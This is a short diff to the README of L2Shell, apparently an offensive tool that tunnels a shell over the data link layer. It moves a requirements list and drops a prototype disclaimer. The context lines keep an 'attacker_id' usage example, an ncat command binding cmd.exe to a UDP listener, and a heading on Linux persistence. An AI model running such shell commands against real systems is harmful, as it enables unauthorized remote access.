@@ -2,6 +2,10 @@
 L2Shell is an opensource tool used for communications via data link layer.
 This script should work for both windows and linux systems.
 
+### Requirements
+- pcap
+- scapy
+
 ## L2Shell Usage
 ```
 python l2shell.py -h
@@ -75,12 +79,6 @@ python l2shell.py -l -a <attacker_id> -s <session_id> -p
 ncat.exe -lvnp 2223 -u -e cmd.exe
 ```
 `note: The proxy option [-p] [--proxy] opens local ports 1111 and 2222`
-
-### Requirements
-- pcap
-- scapy
-
-`note: commands and readme are temporary for the prototype`
 
 ## Linux Persistence via Service
 ```
